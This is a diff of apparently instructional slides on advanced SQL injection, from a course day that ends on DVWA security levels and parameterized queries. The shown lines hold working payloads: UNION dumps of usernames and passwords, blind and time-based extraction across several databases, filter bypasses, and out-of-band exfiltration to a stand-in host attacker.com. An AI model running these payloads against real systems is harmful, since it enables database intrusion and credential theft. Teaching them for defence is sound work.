@@ -1,9 +1,3 @@
----
-marp: true
-theme: default
-paginate: true
----
-
 # Advanced SQL Injection
 
 ## Day 3: UNION Extraction, Blind Injection & Beyond
@@ -47,15 +41,15 @@ Step 9: Escalate (file read/write, OS command)
 SELECT schema_name FROM information_schema.schemata;
 
 -- List tables in a specific database
-SELECT table_name FROM information_schema.tables 
+SELECT table_name FROM information_schema.tables
 WHERE table_schema = 'target_db';
 
 -- List columns in a specific table
-SELECT column_name, data_type FROM information_schema.columns 
+SELECT column_name, data_type FROM information_schema.columns
 WHERE table_schema = 'target_db' AND table_name = 'users';
 
 -- Get table row count
-SELECT table_name, table_rows FROM information_schema.tables 
+SELECT table_name, table_rows FROM information_schema.tables
 WHERE table_schema = 'target_db';
 
 -- List all user privileges
@@ -74,7 +68,7 @@ SELECT datname FROM pg_database;
 SELECT tablename FROM pg_tables WHERE schemaname = 'public';
 
 -- List columns
-SELECT column_name, data_type FROM information_schema.columns 
+SELECT column_name, data_type FROM information_schema.columns
 WHERE table_name = 'users';
 
 -- Current user
@@ -109,7 +103,7 @@ SELECT name FROM sys.tables;
 -- or: SELECT name FROM sysobjects WHERE xtype='U';
 
 -- List columns
-SELECT name, TYPE_NAME(system_type_id) 
+SELECT name, TYPE_NAME(system_type_id)
 FROM sys.columns WHERE object_id = OBJECT_ID('users');
 
 -- Current user and privileges
@@ -136,7 +130,7 @@ SELECT table_name FROM user_tables;
 SELECT owner, table_name FROM all_tables;
 
 -- List columns
-SELECT column_name FROM all_tab_columns 
+SELECT column_name FROM all_tab_columns
 WHERE table_name = 'USERS';
 
 -- Current user
@@ -158,12 +152,12 @@ SELECT 1 FROM dual;
 
 ```sql
 -- MySQL: GROUP_CONCAT (limited to 1024 chars by default)
-' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 
+' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3
   FROM users--
 
 -- Increase limit
-' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 
-  FROM users-- 
+' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3
+  FROM users--
   -- Session variable: SET group_concat_max_len = 1000000
 
 -- Pagination with LIMIT
@@ -173,7 +167,7 @@ SELECT 1 FROM dual;
 
 -- MSSQL: TOP and OFFSET
 ' UNION SELECT TOP 1 username, password FROM users--
-' UNION SELECT username, password FROM users 
+' UNION SELECT username, password FROM users
   ORDER BY username OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--
 ```
 
@@ -191,11 +185,11 @@ id=1 AND LENGTH((SELECT database()))=4  -> TRUE (DB name is 4 chars)
 
 -- Step 3: Extract characters using binary search
 -- Character 1:
-id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>109  
+id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>109
   -> TRUE (char > 'm')
-id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>122  
+id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>122
   -> FALSE (char <= 'z')
-id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>115  
+id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>115
   -> FALSE (char <= 's')
 -- ...narrow down to exact character
 
@@ -251,7 +245,7 @@ print(f"Database: {db_name}")
 
 ```sql
 -- MySQL time-based
-' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)-- 
+' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)--
 
 -- Benchmark alternative (when SLEEP is blocked)
 ' AND IF(1=1, BENCHMARK(10000000, SHA1('test')), 0)--
@@ -260,12 +254,12 @@ print(f"Database: {db_name}")
 '; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:3'--
 
 -- PostgreSQL time-based
-'; SELECT CASE WHEN 
-  (SUBSTRING(current_database(),1,1)='p') 
+'; SELECT CASE WHEN
+  (SUBSTRING(current_database(),1,1)='p')
   THEN pg_sleep(3) ELSE pg_sleep(0) END--
 
 -- Oracle time-based
-' AND CASE WHEN (SUBSTR(user,1,1)='S') 
+' AND CASE WHEN (SUBSTR(user,1,1)='S')
   THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 0 END=0--
 
 -- Measurement: Normal response ~200ms
@@ -286,13 +280,13 @@ SELECT LOAD_FILE(CONCAT('\\\\',
   '.attacker.com\\share'));
 -- DNS query for: dvwa.attacker.com
 
--- MSSQL: DNS via xp_dirtree  
+-- MSSQL: DNS via xp_dirtree
 EXEC master..xp_dirtree '\\attacker.com\share'
 
 -- MSSQL: HTTP via OLE Automation
 DECLARE @o int;
 EXEC sp_OACreate 'MSXML2.XMLHTTP', @o OUT;
-EXEC sp_OAMethod @o, 'open', NULL, 'GET', 
+EXEC sp_OAMethod @o, 'open', NULL, 'GET',
   'http://attacker.com/?data=stolen', false;
 
 -- Oracle: HTTP via UTL_HTTP
@@ -426,7 +420,7 @@ sqlmap -u "http://target.com/page?id=1" \
 '%09OR%091=1--   (URL-encoded tab)
 
 -- Filter: Blocks 'SELECT'
--- Bypass: 
+-- Bypass:
 SeLeCt       (case variation)
 SEL%00ECT    (null byte injection)
 /*!SELECT*/  (MySQL version comment)
@@ -456,7 +450,7 @@ Example:
    (Properly escaped for INSERT - stored safely)
 
 2. Later, admin changes password - app queries by username:
-   UPDATE users SET password='new_pass' 
+   UPDATE users SET password='new_pass'
    WHERE username='admin'--'
    (Retrieved from DB, NOT escaped this time!)
    Result: Updates admin's password!
@@ -724,7 +718,7 @@ High: Different input page, LIMIT 1
 
 Impossible: Parameterized query (cannot exploit)
   Uses PDO prepared statements
-  
+
 Compare the source code at each level to understand
 what makes the "Impossible" level actually secure.
 ```
